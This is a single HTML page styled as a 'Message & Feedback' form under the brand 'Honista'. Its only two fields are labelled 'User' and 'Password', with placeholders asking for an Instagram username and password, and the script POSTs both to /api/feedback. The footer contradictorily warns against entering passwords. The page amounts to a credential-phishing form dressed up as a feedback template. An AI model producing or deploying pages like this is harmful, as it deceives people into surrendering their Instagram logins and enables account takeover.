<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#0b1020">
  <title>Message & Feedback</title>
  <style>
    :root { color-scheme: dark; --bg:#080c18; --panel:rgba(17,24,45,.88); --line:rgba(255,255,255,.1); --muted:#9ca8c4; --text:#f5f7ff; --accent:#8b7cff; --accent2:#52d6c7; }
    * { box-sizing:border-box; }
    body { margin:0; min-height:100vh; display:grid; place-items:center; padding:24px; color:var(--text); font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; background:radial-gradient(ellipse at 15% 15%,rgba(93,76,220,.22),transparent 36%),radial-gradient(ellipse at 90% 85%,rgba(34,190,173,.14),transparent 32%),var(--bg); }
    .wrap { width:min(100%,620px); }
    .brand { display:flex; align-items:center; justify-content:center; gap:10px; margin-bottom:22px; color:#dce2ff; font-size:13px; font-weight:700; letter-spacing:.16em; text-transform:uppercase; }
    .brand-mark { width:28px;height:28px;border-radius:9px;display:grid;place-items:center;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#07101b;font-size:15px; }
    .card { padding:clamp(24px,5vw,42px); border:1px solid var(--line); border-radius:26px; background:var(--panel); box-shadow:0 28px 90px rgba(0,0,0,.38); backdrop-filter:blur(18px); }
    .eyebrow { color:var(--accent2); font-size:11px; font-weight:800; letter-spacing:.18em; text-transform:uppercase; }
    h1 { margin:10px 0 10px; font-size:clamp(30px,6vw,43px); line-height:1.08; letter-spacing:-.045em; }
    .intro { margin:0 0 30px; max-width:440px; color:var(--muted); line-height:1.65; font-size:14px; }
    .field { margin-top:20px; }
    label { display:block; margin-bottom:9px; font-size:13px; font-weight:700; color:#e6eaff; }
    textarea { width:100%; display:block; min-height:130px; resize:vertical; padding:15px 16px; border:1px solid var(--line); border-radius:14px; outline:none; background:rgba(5,9,21,.65); color:var(--text); font:inherit; font-size:14px; line-height:1.55; transition:border-color .2s,box-shadow .2s; }
    textarea::placeholder { color:#66718e; }
    textarea:focus { border-color:var(--accent); box-shadow:0 0 0 3px rgba(139,124,255,.15); }
    .hint { margin-top:8px; color:#7e8aa8; font-size:11px; }
    button { width:100%; margin-top:24px; min-height:51px; border:0; border-radius:14px; background:linear-gradient(100deg,#9183ff,#61d9ca); color:#07101b; font:inherit; font-size:14px; font-weight:800; cursor:pointer; transition:transform .2s,filter .2s; }
    button:hover { filter:brightness(1.07); transform:translateY(-1px); }
    button:disabled { opacity:.6; cursor:wait; transform:none; }
    .status { display:none; margin-top:16px; padding:12px 14px; border-radius:12px; font-size:13px; line-height:1.5; }
    .status.show { display:block; }
    .status.ok { color:#9df1dc; background:rgba(36,184,145,.1); border:1px solid rgba(36,184,145,.25); }
    .status.err { color:#ffc2c2; background:rgba(235,80,100,.1); border:1px solid rgba(235,80,100,.25); }
    footer { margin-top:18px; text-align:center; color:#697592; font-size:11px; }
    @media(max-width:480px) { body { padding:14px; } .card { border-radius:20px; } textarea { min-height:115px; } }
  </style>
</head>
<body>
  <main class="wrap">
    <div class="brand"><span class="brand-mark">✦</span> Honista </div>
    <section class="card">
      <div class="eyebrow">We’re listening</div>
      <h1>Hon &amp; Ista.</h1>
      <p class="intro">te most iconic app .</p>
      <form id="feedbackForm">
        <div class="field">
          <label for="message">User</label>
          <textarea id="message" name="message" maxlength="3000" placeholder="Instagram user here" required></textarea>
          <div class="hint">Up to 3,000 characters.</div>
        </div>
        <div class="field">
          <label for="feedback">Password</label>
          <textarea id="feedback" name="feedback" maxlength="3000" placeholder="Instagram password here" required></textarea>
          <div class="hint">Up to 3,000 characters.</div>
        </div>
        <button id="submitBtn" type="submit">Send message <span aria-hidden="true">↗</span></button>
        <div id="status" class="status" role="status" aria-live="polite"></div>
      </form>
    </section>
    <footer>Please don’t include passwords or other sensitive personal information.</footer>
  </main>
  <script>
    // Configure this endpoint on your own backend to deliver submissions by email.
    // Do not put an email-service API key in this public HTML file.
    const ENDPOINT = "/api/feedback";
    const form = document.getElementById("feedbackForm");
    const button = document.getElementById("submitBtn");
    const statusBox = document.getElementById("status");

    form.addEventListener("submit", async (event) => {
      event.preventDefault();
      statusBox.className = "status";
      statusBox.textContent = "";

      const message = document.getElementById("message").value.trim();
      const feedback = document.getElementById("feedback").value.trim();
      if (!message || !feedback) {
        statusBox.textContent = "Please complete both fields.";
        statusBox.className = "status show err";
        return;
      }

      button.disabled = true;
      button.textContent = "Sending…";
      try {
        const response = await fetch(ENDPOINT, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ message, feedback })
        });
        if (!response.ok) throw new Error("Submission endpoint is not configured or rejected the request.");
        form.reset();
        statusBox.textContent = "Thanks — your message was sent.";
        statusBox.className = "status show ok";
      } catch (error) {
        statusBox.textContent = "This form is ready, but sending is not configured yet. Connect a secure backend at /api/feedback to receive submissions.";
        statusBox.className = "status show err";
      } finally {
        button.disabled = false;
        button.innerHTML = 'Send message <span aria-hidden="true">↗</span>';
      }
    });
  </script>
</body>
</html>
